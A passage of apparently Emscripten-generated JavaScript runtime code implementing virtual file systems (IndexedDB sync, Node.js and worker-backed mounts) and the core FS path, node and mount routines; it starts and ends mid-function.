            var stat = FS.stat(path);
            if (FS.isDir(stat.mode)) {
                FS.rmdir(path)
            } else if (FS.isFile(stat.mode)) {
                FS.unlink(path)
            }
        } catch (e) {
            return callback(e)
        }
        callback(null)
    }),
    loadRemoteEntry: (function(store, path, callback) {
        var req = store.get(path);
        req.onsuccess = (function(event) {
            callback(null, event.target.result)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    storeRemoteEntry: (function(store, path, entry, callback) {
        var req = store.put(entry, path);
        req.onsuccess = (function() {
            callback(null)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    removeRemoteEntry: (function(store, path, callback) {
        var req = store.delete(path);
        req.onsuccess = (function() {
            callback(null)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    reconcile: (function(src, dst, callback) {
        var total = 0;
        var create = [];
        Object.keys(src.entries).forEach((function(key) {
            var e = src.entries[key];
            var e2 = dst.entries[key];
            if (!e2 || e.timestamp > e2.timestamp) {
                create.push(key);
                total++
            }
        }));
        var remove = [];
        Object.keys(dst.entries).forEach((function(key) {
            var e = dst.entries[key];
            var e2 = src.entries[key];
            if (!e2) {
                remove.push(key);
                total++
            }
        }));
        if (!total) {
            return callback(null)
        }
        var completed = 0;
        var db = src.type === "remote" ? src.db : dst.db;
        var transaction = db.transaction([IDBFS.DB_STORE_NAME], "readwrite");
        var store = transaction.objectStore(IDBFS.DB_STORE_NAME);

        function done(err) {
            if (err) {
                if (!done.errored) {
                    done.errored = true;
                    return callback(err)
                }
                return
            }
            if (++completed >= total) {
                return callback(null)
            }
        }
        transaction.onerror = (function(e) {
            done(this.error);
            e.preventDefault()
        });
        create.sort().forEach((function(path) {
            if (dst.type === "local") {
                IDBFS.loadRemoteEntry(store, path, (function(err, entry) {
                    if (err) return done(err);
                    IDBFS.storeLocalEntry(path, entry, done)
                }))
            } else {
                IDBFS.loadLocalEntry(path, (function(err, entry) {
                    if (err) return done(err);
                    IDBFS.storeRemoteEntry(store, path, entry, done)
                }))
            }
        }));
        remove.sort().reverse().forEach((function(path) {
            if (dst.type === "local") {
                IDBFS.removeLocalEntry(path, done)
            } else {
                IDBFS.removeRemoteEntry(store, path, done)
            }
        }))
    })
};
var NODEFS = {
    isWindows: false,
    staticInit: (function() {
        NODEFS.isWindows = !!process.platform.match(/^win/)
    }),
    mount: (function(mount) {
        assert(ENVIRONMENT_IS_NODE);
        return NODEFS.createNode(null, "/", NODEFS.getMode(mount.opts.root), 0)
    }),
    createNode: (function(parent, name, mode, dev) {
        if (!FS.isDir(mode) && !FS.isFile(mode) && !FS.isLink(mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var node = FS.createNode(parent, name, mode);
        node.node_ops = NODEFS.node_ops;
        node.stream_ops = NODEFS.stream_ops;
        return node
    }),
    getMode: (function(path) {
        var stat;
        try {
            stat = fs.lstatSync(path);
            if (NODEFS.isWindows) {
                stat.mode = stat.mode | (stat.mode & 146) >> 1
            }
        } catch (e) {
            if (!e.code) throw e;
            throw new FS.ErrnoError(ERRNO_CODES[e.code])
        }
        return stat.mode
    }),
    realPath: (function(node) {
        var parts = [];
        while (node.parent !== node) {
            parts.push(node.name);
            node = node.parent
        }
        parts.push(node.mount.opts.root);
        parts.reverse();
        return PATH.join.apply(null, parts)
    }),
    flagsToPermissionStringMap: {
        0: "r",
        1: "r+",
        2: "r+",
        64: "r",
        65: "r+",
        66: "r+",
        129: "rx+",
        193: "rx+",
        514: "w+",
        577: "w",
        578: "w+",
        705: "wx",
        706: "wx+",
        1024: "a",
        1025: "a",
        1026: "a+",
        1089: "a",
        1090: "a+",
        1153: "ax",
        1154: "ax+",
        1217: "ax",
        1218: "ax+",
        4096: "rs",
        4098: "rs+"
    },
    flagsToPermissionString: (function(flags) {
        flags &= ~2097152;
        flags &= ~2048;
        flags &= ~32768;
        flags &= ~524288;
        if (flags in NODEFS.flagsToPermissionStringMap) {
            return NODEFS.flagsToPermissionStringMap[flags]
        } else {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
    }),
    node_ops: {
        getattr: (function(node) {
            var path = NODEFS.realPath(node);
            var stat;
            try {
                stat = fs.lstatSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            if (NODEFS.isWindows && !stat.blksize) {
                stat.blksize = 4096
            }
            if (NODEFS.isWindows && !stat.blocks) {
                stat.blocks = (stat.size + stat.blksize - 1) / stat.blksize | 0
            }
            return {
                dev: stat.dev,
                ino: stat.ino,
                mode: stat.mode,
                nlink: stat.nlink,
                uid: stat.uid,
                gid: stat.gid,
                rdev: stat.rdev,
                size: stat.size,
                atime: stat.atime,
                mtime: stat.mtime,
                ctime: stat.ctime,
                blksize: stat.blksize,
                blocks: stat.blocks
            }
        }),
        setattr: (function(node, attr) {
            var path = NODEFS.realPath(node);
            try {
                if (attr.mode !== undefined) {
                    fs.chmodSync(path, attr.mode);
                    node.mode = attr.mode
                }
                if (attr.timestamp !== undefined) {
                    var date = new Date(attr.timestamp);
                    fs.utimesSync(path, date, date)
                }
                if (attr.size !== undefined) {
                    fs.truncateSync(path, attr.size)
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        lookup: (function(parent, name) {
            var path = PATH.join2(NODEFS.realPath(parent), name);
            var mode = NODEFS.getMode(path);
            return NODEFS.createNode(parent, name, mode)
        }),
        mknod: (function(parent, name, mode, dev) {
            var node = NODEFS.createNode(parent, name, mode, dev);
            var path = NODEFS.realPath(node);
            try {
                if (FS.isDir(node.mode)) {
                    fs.mkdirSync(path, node.mode)
                } else {
                    fs.writeFileSync(path, "", {
                        mode: node.mode
                    })
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            return node
        }),
        rename: (function(oldNode, newDir, newName) {
            var oldPath = NODEFS.realPath(oldNode);
            var newPath = PATH.join2(NODEFS.realPath(newDir), newName);
            try {
                fs.renameSync(oldPath, newPath)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        unlink: (function(parent, name) {
            var path = PATH.join2(NODEFS.realPath(parent), name);
            try {
                fs.unlinkSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        rmdir: (function(parent, name) {
            var path = PATH.join2(NODEFS.realPath(parent), name);
            try {
                fs.rmdirSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        readdir: (function(node) {
            var path = NODEFS.realPath(node);
            try {
                return fs.readdirSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        symlink: (function(parent, newName, oldPath) {
            var newPath = PATH.join2(NODEFS.realPath(parent), newName);
            try {
                fs.symlinkSync(oldPath, newPath)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        readlink: (function(node) {
            var path = NODEFS.realPath(node);
            try {
                path = fs.readlinkSync(path);
                path = NODEJS_PATH.relative(NODEJS_PATH.resolve(node.mount.opts.root), path);
                return path
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        })
    },
    stream_ops: {
        open: (function(stream) {
            var path = NODEFS.realPath(stream.node);
            try {
                if (FS.isFile(stream.node.mode)) {
                    stream.nfd = fs.openSync(path, NODEFS.flagsToPermissionString(stream.flags))
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        close: (function(stream) {
            try {
                if (FS.isFile(stream.node.mode) && stream.nfd) {
                    fs.closeSync(stream.nfd)
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        read: (function(stream, buffer, offset, length, position) {
            if (length === 0) return 0;
            var nbuffer = new Buffer(length);
            var res;
            try {
                res = fs.readSync(stream.nfd, nbuffer, 0, length, position)
            } catch (e) {
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            if (res > 0) {
                for (var i = 0; i < res; i++) {
                    buffer[offset + i] = nbuffer[i]
                }
            }
            return res
        }),
        write: (function(stream, buffer, offset, length, position) {
            var nbuffer = new Buffer(buffer.subarray(offset, offset + length));
            var res;
            try {
                res = fs.writeSync(stream.nfd, nbuffer, 0, length, position)
            } catch (e) {
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            return res
        }),
        llseek: (function(stream, offset, whence) {
            var position = offset;
            if (whence === 1) {
                position += stream.position
            } else if (whence === 2) {
                if (FS.isFile(stream.node.mode)) {
                    try {
                        var stat = fs.fstatSync(stream.nfd);
                        position += stat.size
                    } catch (e) {
                        throw new FS.ErrnoError(ERRNO_CODES[e.code])
                    }
                }
            }
            if (position < 0) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return position
        })
    }
};
var WORKERFS = {
    DIR_MODE: 16895,
    FILE_MODE: 33279,
    reader: null,
    mount: (function(mount) {
        assert(ENVIRONMENT_IS_WORKER);
        if (!WORKERFS.reader) WORKERFS.reader = new FileReaderSync;
        var root = WORKERFS.createNode(null, "/", WORKERFS.DIR_MODE, 0);
        var createdParents = {};

        function ensureParent(path) {
            var parts = path.split("/");
            var parent = root;
            for (var i = 0; i < parts.length - 1; i++) {
                var curr = parts.slice(0, i + 1).join("/");
                if (!createdParents[curr]) {
                    createdParents[curr] = WORKERFS.createNode(parent, parts[i], WORKERFS.DIR_MODE, 0)
                }
                parent = createdParents[curr]
            }
            return parent
        }

        function base(path) {
            var parts = path.split("/");
            return parts[parts.length - 1]
        }
        Array.prototype.forEach.call(mount.opts["files"] || [], (function(file) {
            WORKERFS.createNode(ensureParent(file.name), base(file.name), WORKERFS.FILE_MODE, 0, file, file.lastModifiedDate)
        }));
        (mount.opts["blobs"] || []).forEach((function(obj) {
            WORKERFS.createNode(ensureParent(obj["name"]), base(obj["name"]), WORKERFS.FILE_MODE, 0, obj["data"])
        }));
        (mount.opts["packages"] || []).forEach((function(pack) {
            pack["metadata"].files.forEach((function(file) {
                var name = file.filename.substr(1);
                WORKERFS.createNode(ensureParent(name), base(name), WORKERFS.FILE_MODE, 0, pack["blob"].slice(file.start, file.end))
            }))
        }));
        return root
    }),
    createNode: (function(parent, name, mode, dev, contents, mtime) {
        var node = FS.createNode(parent, name, mode);
        node.mode = mode;
        node.node_ops = WORKERFS.node_ops;
        node.stream_ops = WORKERFS.stream_ops;
        node.timestamp = (mtime || new Date).getTime();
        assert(WORKERFS.FILE_MODE !== WORKERFS.DIR_MODE);
        if (mode === WORKERFS.FILE_MODE) {
            node.size = contents.size;
            node.contents = contents
        } else {
            node.size = 4096;
            node.contents = {}
        }
        if (parent) {
            parent.contents[name] = node
        }
        return node
    }),
    node_ops: {
        getattr: (function(node) {
            return {
                dev: 1,
                ino: undefined,
                mode: node.mode,
                nlink: 1,
                uid: 0,
                gid: 0,
                rdev: undefined,
                size: node.size,
                atime: new Date(node.timestamp),
                mtime: new Date(node.timestamp),
                ctime: new Date(node.timestamp),
                blksize: 4096,
                blocks: Math.ceil(node.size / 4096)
            }
        }),
        setattr: (function(node, attr) {
            if (attr.mode !== undefined) {
                node.mode = attr.mode
            }
            if (attr.timestamp !== undefined) {
                node.timestamp = attr.timestamp
            }
        }),
        lookup: (function(parent, name) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }),
        mknod: (function(parent, name, mode, dev) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        rename: (function(oldNode, newDir, newName) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        unlink: (function(parent, name) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        rmdir: (function(parent, name) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        readdir: (function(node) {
            var entries = [".", ".."];
            for (var key in node.contents) {
                if (!node.contents.hasOwnProperty(key)) {
                    continue
                }
                entries.push(key)
            }
            return entries
        }),
        symlink: (function(parent, newName, oldPath) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        readlink: (function(node) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        })
    },
    stream_ops: {
        read: (function(stream, buffer, offset, length, position) {
            if (position >= stream.node.size) return 0;
            var chunk = stream.node.contents.slice(position, position + length);
            var ab = WORKERFS.reader.readAsArrayBuffer(chunk);
            buffer.set(new Uint8Array(ab), offset);
            return chunk.size
        }),
        write: (function(stream, buffer, offset, length, position) {
            throw new FS.ErrnoError(ERRNO_CODES.EIO)
        }),
        llseek: (function(stream, offset, whence) {
            var position = offset;
            if (whence === 1) {
                position += stream.position
            } else if (whence === 2) {
                if (FS.isFile(stream.node.mode)) {
                    position += stream.node.size
                }
            }
            if (position < 0) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return position
        })
    }
};
STATICTOP += 16;
STATICTOP += 16;
STATICTOP += 16;
var FS = {
    root: null,
    mounts: [],
    devices: [null],
    streams: [],
    nextInode: 1,
    nameTable: null,
    currentPath: "/",
    initialized: false,
    ignorePermissions: true,
    trackingDelegate: {},
    tracking: {
        openFlags: {
            READ: 1,
            WRITE: 2
        }
    },
    ErrnoError: null,
    genericErrors: {},
    filesystems: null,
    syncFSRequests: 0,
    handleFSError: (function(e) {
        if (!(e instanceof FS.ErrnoError)) throw e + " : " + stackTrace();
        return ___setErrNo(e.errno)
    }),
    lookupPath: (function(path, opts) {
        path = PATH.resolve(FS.cwd(), path);
        opts = opts || {};
        if (!path) return {
            path: "",
            node: null
        };
        var defaults = {
            follow_mount: true,
            recurse_count: 0
        };
        for (var key in defaults) {
            if (opts[key] === undefined) {
                opts[key] = defaults[key]
            }
        }
        if (opts.recurse_count > 8) {
            throw new FS.ErrnoError(ERRNO_CODES.ELOOP)
        }
        var parts = PATH.normalizeArray(path.split("/").filter((function(p) {
            return !!p
        })), false);
        var current = FS.root;
        var current_path = "/";
        for (var i = 0; i < parts.length; i++) {
            var islast = i === parts.length - 1;
            if (islast && opts.parent) {
                break
            }
            current = FS.lookupNode(current, parts[i]);
            current_path = PATH.join2(current_path, parts[i]);
            if (FS.isMountpoint(current)) {
                if (!islast || islast && opts.follow_mount) {
                    current = current.mounted.root
                }
            }
            if (!islast || opts.follow) {
                var count = 0;
                while (FS.isLink(current.mode)) {
                    var link = FS.readlink(current_path);
                    current_path = PATH.resolve(PATH.dirname(current_path), link);
                    var lookup = FS.lookupPath(current_path, {
                        recurse_count: opts.recurse_count
                    });
                    current = lookup.node;
                    if (count++ > 40) {
                        throw new FS.ErrnoError(ERRNO_CODES.ELOOP)
                    }
                }
            }
        }
        return {
            path: current_path,
            node: current
        }
    }),
    getPath: (function(node) {
        var path;
        while (true) {
            if (FS.isRoot(node)) {
                var mount = node.mount.mountpoint;
                if (!path) return mount;
                return mount[mount.length - 1] !== "/" ? mount + "/" + path : mount + path
            }
            path = path ? node.name + "/" + path : node.name;
            node = node.parent
        }
    }),
    hashName: (function(parentid, name) {
        var hash = 0;
        for (var i = 0; i < name.length; i++) {
            hash = (hash << 5) - hash + name.charCodeAt(i) | 0
        }
        return (parentid + hash >>> 0) % FS.nameTable.length
    }),
    hashAddNode: (function(node) {
        var hash = FS.hashName(node.parent.id, node.name);
        node.name_next = FS.nameTable[hash];
        FS.nameTable[hash] = node
    }),
    hashRemoveNode: (function(node) {
        var hash = FS.hashName(node.parent.id, node.name);
        if (FS.nameTable[hash] === node) {
            FS.nameTable[hash] = node.name_next
        } else {
            var current = FS.nameTable[hash];
            while (current) {
                if (current.name_next === node) {
                    current.name_next = node.name_next;
                    break
                }
                current = current.name_next
            }
        }
    }),
    lookupNode: (function(parent, name) {
        var err = FS.mayLookup(parent);
        if (err) {
            throw new FS.ErrnoError(err, parent)
        }
        var hash = FS.hashName(parent.id, name);
        for (var node = FS.nameTable[hash]; node; node = node.name_next) {
            var nodeName = node.name;
            if (node.parent.id === parent.id && nodeName === name) {
                return node
            }
        }
        return FS.lookup(parent, name)
    }),
    createNode: (function(parent, name, mode, rdev) {
        if (!FS.FSNode) {
            FS.FSNode = (function(parent, name, mode, rdev) {
                if (!parent) {
                    parent = this
                }
                this.parent = parent;
                this.mount = parent.mount;
                this.mounted = null;
                this.id = FS.nextInode++;
                this.name = name;
                this.mode = mode;
                this.node_ops = {};
                this.stream_ops = {};
                this.rdev = rdev
            });
            FS.FSNode.prototype = {};
            var readMode = 292 | 73;
            var writeMode = 146;
            Object.defineProperties(FS.FSNode.prototype, {
                read: {
                    get: (function() {
                        return (this.mode & readMode) === readMode
                    }),
                    set: (function(val) {
                        val ? this.mode |= readMode : this.mode &= ~readMode
                    })
                },
                write: {
                    get: (function() {
                        return (this.mode & writeMode) === writeMode
                    }),
                    set: (function(val) {
                        val ? this.mode |= writeMode : this.mode &= ~writeMode
                    })
                },
                isFolder: {
                    get: (function() {
                        return FS.isDir(this.mode)
                    })
                },
                isDevice: {
                    get: (function() {
                        return FS.isChrdev(this.mode)
                    })
                }
            })
        }
        var node = new FS.FSNode(parent, name, mode, rdev);
        FS.hashAddNode(node);
        return node
    }),
    destroyNode: (function(node) {
        FS.hashRemoveNode(node)
    }),
    isRoot: (function(node) {
        return node === node.parent
    }),
    isMountpoint: (function(node) {
        return !!node.mounted
    }),
    isFile: (function(mode) {
        return (mode & 61440) === 32768
    }),
    isDir: (function(mode) {
        return (mode & 61440) === 16384
    }),
    isLink: (function(mode) {
        return (mode & 61440) === 40960
    }),
    isChrdev: (function(mode) {
        return (mode & 61440) === 8192
    }),
    isBlkdev: (function(mode) {
        return (mode & 61440) === 24576
    }),
    isFIFO: (function(mode) {
        return (mode & 61440) === 4096
    }),
    isSocket: (function(mode) {
        return (mode & 49152) === 49152
    }),
    flagModes: {
        "r": 0,
        "rs": 1052672,
        "r+": 2,
        "w": 577,
        "wx": 705,
        "xw": 705,
        "w+": 578,
        "wx+": 706,
        "xw+": 706,
        "a": 1089,
        "ax": 1217,
        "xa": 1217,
        "a+": 1090,
        "ax+": 1218,
        "xa+": 1218
    },
    modeStringToFlags: (function(str) {
        var flags = FS.flagModes[str];
        if (typeof flags === "undefined") {
            throw new Error("Unknown file open mode: " + str)
        }
        return flags
    }),
    flagsToPermissionString: (function(flag) {
        var perms = ["r", "w", "rw"][flag & 3];
        if (flag & 512) {
            perms += "w"
        }
        return perms
    }),
    nodePermissions: (function(node, perms) {
        if (FS.ignorePermissions) {
            return 0
        }
        if (perms.indexOf("r") !== -1 && !(node.mode & 292)) {
            return ERRNO_CODES.EACCES
        } else if (perms.indexOf("w") !== -1 && !(node.mode & 146)) {
            return ERRNO_CODES.EACCES
        } else if (perms.indexOf("x") !== -1 && !(node.mode & 73)) {
            return ERRNO_CODES.EACCES
        }
        return 0
    }),
    mayLookup: (function(dir) {
        var err = FS.nodePermissions(dir, "x");
        if (err) return err;
        if (!dir.node_ops.lookup) return ERRNO_CODES.EACCES;
        return 0
    }),
    mayCreate: (function(dir, name) {
        try {
            var node = FS.lookupNode(dir, name);
            return ERRNO_CODES.EEXIST
        } catch (e) {}
        return FS.nodePermissions(dir, "wx")
    }),
    mayDelete: (function(dir, name, isdir) {
        var node;
        try {
            node = FS.lookupNode(dir, name)
        } catch (e) {
            return e.errno
        }
        var err = FS.nodePermissions(dir, "wx");
        if (err) {
            return err
        }
        if (isdir) {
            if (!FS.isDir(node.mode)) {
                return ERRNO_CODES.ENOTDIR
            }
            if (FS.isRoot(node) || FS.getPath(node) === FS.cwd()) {
                return ERRNO_CODES.EBUSY
            }
        } else {
            if (FS.isDir(node.mode)) {
                return ERRNO_CODES.EISDIR
            }
        }
        return 0
    }),
    mayOpen: (function(node, flags) {
        if (!node) {
            return ERRNO_CODES.ENOENT
        }
        if (FS.isLink(node.mode)) {
            return ERRNO_CODES.ELOOP
        } else if (FS.isDir(node.mode)) {
            if (FS.flagsToPermissionString(flags) !== "r" || flags & 512) {
                return ERRNO_CODES.EISDIR
            }
        }
        return FS.nodePermissions(node, FS.flagsToPermissionString(flags))
    }),
    MAX_OPEN_FDS: 4096,
    nextfd: (function(fd_start, fd_end) {
        fd_start = fd_start || 0;
        fd_end = fd_end || FS.MAX_OPEN_FDS;
        for (var fd = fd_start; fd <= fd_end; fd++) {
            if (!FS.streams[fd]) {
                return fd
            }
        }
        throw new FS.ErrnoError(ERRNO_CODES.EMFILE)
    }),
    getStream: (function(fd) {
        return FS.streams[fd]
    }),
    createStream: (function(stream, fd_start, fd_end) {
        if (!FS.FSStream) {
            FS.FSStream = (function() {});
            FS.FSStream.prototype = {};
            Object.defineProperties(FS.FSStream.prototype, {
                object: {
                    get: (function() {
                        return this.node
                    }),
                    set: (function(val) {
                        this.node = val
                    })
                },
                isRead: {
                    get: (function() {
                        return (this.flags & 2097155) !== 1
                    })
                },
                isWrite: {
                    get: (function() {
                        return (this.flags & 2097155) !== 0
                    })
                },
                isAppend: {
                    get: (function() {
                        return this.flags & 1024
                    })
                }
            })
        }
        var newStream = new FS.FSStream;
        for (var p in stream) {
            newStream[p] = stream[p]
        }
        stream = newStream;
        var fd = FS.nextfd(fd_start, fd_end);
        stream.fd = fd;
        FS.streams[fd] = stream;
        return stream
    }),
    closeStream: (function(fd) {
        FS.streams[fd] = null
    }),
    chrdev_stream_ops: {
        open: (function(stream) {
            var device = FS.getDevice(stream.node.rdev);
            stream.stream_ops = device.stream_ops;
            if (stream.stream_ops.open) {
                stream.stream_ops.open(stream)
            }
        }),
        llseek: (function() {
            throw new FS.ErrnoError(ERRNO_CODES.ESPIPE)
        })
    },
    major: (function(dev) {
        return dev >> 8
    }),
    minor: (function(dev) {
        return dev & 255
    }),
    makedev: (function(ma, mi) {
        return ma << 8 | mi
    }),
    registerDevice: (function(dev, ops) {
        FS.devices[dev] = {
            stream_ops: ops
        }
    }),
    getDevice: (function(dev) {
        return FS.devices[dev]
    }),
    getMounts: (function(mount) {
        var mounts = [];
        var check = [mount];
        while (check.length) {
            var m = check.pop();
            mounts.push(m);
            check.push.apply(check, m.mounts)
        }
        return mounts
    }),
    syncfs: (function(populate, callback) {
        if (typeof populate === "function") {
            callback = populate;
            populate = false
        }
        FS.syncFSRequests++;
        if (FS.syncFSRequests > 1) {
            console.log("warning: " + FS.syncFSRequests + " FS.syncfs operations in flight at once, probably just doing extra work")
        }
        var mounts = FS.getMounts(FS.root.mount);
        var completed = 0;

        function doCallback(err) {
            assert(FS.syncFSRequests > 0);
            FS.syncFSRequests--;
            return callback(err)
        }

        function done(err) {
            if (err) {
                if (!done.errored) {
                    done.errored = true;
                    return doCallback(err)
                }
                return
            }
            if (++completed >= mounts.length) {
                doCallback(null)
            }
        }
        mounts.forEach((function(mount) {
            if (!mount.type.syncfs) {
                return done(null)
            }
            mount.type.syncfs(mount, populate, done)
        }))
    }),
    mount: (function(type, opts, mountpoint) {
        var root = mountpoint === "/";
        var pseudo = !mountpoint;
        var node;
        if (root && FS.root) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        } else if (!root && !pseudo) {
            var lookup = FS.lookupPath(mountpoint, {
                follow_mount: false
            });
            mountpoint = lookup.path;
            node = lookup.node;
            if (FS.isMountpoint(node)) {
                throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
            }
            if (!FS.isDir(node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.ENOTDIR)
            }
        }
        var mount = {
            type: type,
            opts: opts,
            mountpoint: mountpoint,
            mounts: []
        };
        var mountRoot = type.mount(mount);
        mountRoot.mount = mount;
        mount.root = mountRoot;
        if (root) {
            FS.root = mountRoot
        } else if (node) {
            node.mounted = mount;
            if (node.mount) {
                node.mount.mounts.push(mount)
            }
        }
        return mountRoot
    }),
    unmount: (function(mountpoint) {
        var lookup = FS.lookupPath(mountpoint, {
            follow_mount: false
        });
        if (!FS.isMountpoint(lookup.node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var node = lookup.node;
        var mount = node.mounted;
        var mounts = FS.getMounts(mount);
        Object.keys(FS.nameTable).forEach((function(hash) {
            var current = FS.nameTable[hash];
            while (current) {
                var next = current.name_next;
                if (mounts.indexOf(current.mount) !== -1) {
                    FS.destroyNode(current)
                }
                current = next
            }
        }));
        node.mounted = null;
        var idx = node.mount.mounts.indexOf(mount);
        assert(idx !== -1);
        node.mount.mounts.splice(idx, 1)
    }),
    lookup: (function(parent, name) {
        return parent.node_ops.lookup(parent, name)
    }),
    mknod: (function(path, mode, dev) {
        var lookup = FS.lookupPath(path, {
            parent: true
        });
        var parent = lookup.node;
        var name = PATH.basename(path);
        if (!name || name === "." || name === "..") {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var err = FS.mayCreate(parent, name);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.mknod) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        return parent.node_ops.mknod(parent, name, mode, dev)
    }),
    create: (function(path, mode) {
        mode = mode !== undefined ? mode : 438;
        mode &= 4095;
        mode |= 32768;
        return FS.mknod(path, mode, 0)
    }),
    mkdir: (function(path, mode) {
        mode = mode !== undefined ? mode : 511;
        mode &= 511 | 512;
        mode |= 16384;
        return FS.mknod(path, mode, 0)
    }),
    mkdirTree: (function(path, mode) {
        var dirs = path.split("/");
        var d = "";
        for (var i = 0; i < dirs.length; ++i) {
            if (!dirs[i]) continue;
            d += "/" + dirs[i];
            try {
                FS.mkdir(d, mode)
            } catch (e) {
                if (e.errno != ERRNO_CODES.EEXIST) throw e
            }
        }
    }),
    mkdev: (function(path, mode, dev) {
        if (typeof dev === "undefined") {
            dev = mode;
            mode = 438
        }
        mode |= 8192;
        return FS.mknod(path, mode, dev)
    }),
    symlink: (function(oldpath, newpath) {
        if (!PATH.resolve(oldpath)) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        var lookup = FS.lookupPath(newpath, {
            parent: true
        });
        var parent = lookup.node;
        if (!parent) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }
        var newname = PATH.basename(newpath);
        var err = FS.mayCreate(parent, newname);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.symlink) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        return parent.node_ops.symlink(parent, newname, oldpath)
    }),
    rename: (function(old_path, new_path) {
        var old_dirname = PATH.dirname(old_path);
        var new_dirname = PATH.dirname(new_path);
        var old_name = PATH.basename(old_path);
        var new_name = PATH.basename(new_path);
        var lookup, old_dir, new_dir;
        try {
            lookup = FS.lookupPath(old_path, {
                parent: true
            });
            old_dir = lookup.node;
            lookup = FS.lookupPath(new_path, {
                parent: true
            });
            new_dir = lookup.node
        } catch (e) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        if (!old_dir || !new_dir) throw new FS.ErrnoError(ERRNO_CODES.ENOENT);
        if (old_dir.mount !== new_dir.mount) {
            throw new FS.ErrnoError(ERRNO_CODES.EXDEV)
        }
        var old_node = FS.lookupNode(old_dir, old_name);
        var relative = PATH.relative(old_path, new_dirname);
        if (relative.charAt(0) !== ".") {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        relative = PATH.relative(new_path, old_dirname);
        if (relative.charAt(0) !== ".") {
            throw new FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)
        }
        var new_node;
        try {
            new_node = FS.lookupNode(new_dir, new_name)
        } catch (e) {}
        if (old_node === new_node) {
            return
        }
        var isdir = FS.isDir(old_node.mode);
        var err = FS.mayDelete(old_dir, old_name, isdir);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        err = new_node ? FS.mayDelete(new_dir, new_name, isdir) : FS.mayCreate(new_dir, new_name);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!old_dir.node_ops.rename) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isMountpoint(old_node) || new_node && FS.isMountpoint(new_node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        if (new_dir !== old_dir) {
            err = FS.nodePermissions(old_dir, "w");
            if (err) {
                throw new FS.ErrnoError(err)
            }
        }
        try {
            if (FS.trackingDelegate["willMovePath"]) {
                FS.trackingDelegate["willMovePath"](old_path, new_path)
            }
        } catch (e) {
            console.log("FS.trackingDelegate['willMovePath']('" + old_path + "', '" + new_path + "') threw an exception: " + e.message)
        }
        FS.hashRemoveNode(old_node);
        try {
            old_dir.node_ops.rename(old_node, new_dir, new_name)
        } catch (e) {
            throw e
        } finally {
            FS.hashAddNode(old_node)
        }
        try {
            if (FS.trackingDelegate["onMovePath"]) FS.trackingDelegate["onMovePath"](old_path, new_path)
        } catch (e) {
            console.log("FS.trackingDelegate['onMovePath']('" + old_path + "', '" + new_path + "') threw an exception: " + e.message)
        }
    }),
    rmdir: (function(path) {
        var lookup = FS.lookupPath(path, {
            parent: true
        });
        var parent = lookup.node;
        var name = PATH.basename(path);
        var node = FS.lookupNode(parent, name);
        var err = FS.mayDelete(parent, name, true);
        if (err) {
            throw new FS.ErrnoError(err)
        }
        if (!parent.node_ops.rmdir) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }
        if (FS.isMountpoint(node)) {
            throw new FS.ErrnoError(ERRNO_CODES.EBUSY)
        }
        try {
            if (FS.trackingDelegate["willDeletePath"]) {
